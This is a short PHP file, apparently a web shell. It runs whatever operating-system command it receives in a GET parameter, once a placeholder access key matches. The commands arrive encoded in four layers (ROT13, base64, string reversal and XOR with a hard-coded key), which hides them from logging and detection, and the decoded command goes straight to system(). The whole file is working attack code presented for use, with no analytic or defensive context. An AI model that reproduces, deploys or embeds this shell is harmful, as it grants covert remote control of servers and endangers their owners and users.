<?php
// ================================================================
// OBFUSCATED PLUS – Multi-layer Obfuscation (FIXED)
// ================================================================

// Auth
if (!isset($_GET['key']) || $_GET['key'] !== 'your_secret_key') {
    die('Access denied');
}

$cmd = isset($_GET['cmd']) ? $_GET['cmd'] : '';

if ($cmd) {
    // Layer 1: ROT13
    $cmd = str_rot13($cmd);
    
    // Layer 2: Base64 decode
    $cmd = base64_decode($cmd, true);
    if ($cmd === false) die('Invalid base64');
    
    // Layer 3: Reverse string
    $cmd = strrev($cmd);
    
    // Layer 4: XOR dengan key
    $key = 'x9F#2mQ!7kL$5pR*';
    $out = '';
    for ($i = 0; $i < strlen($cmd); $i++) {
        $out .= chr(ord($cmd[$i]) ^ ord($key[$i % strlen($key)]));
    }
    
    system($out);
}
?>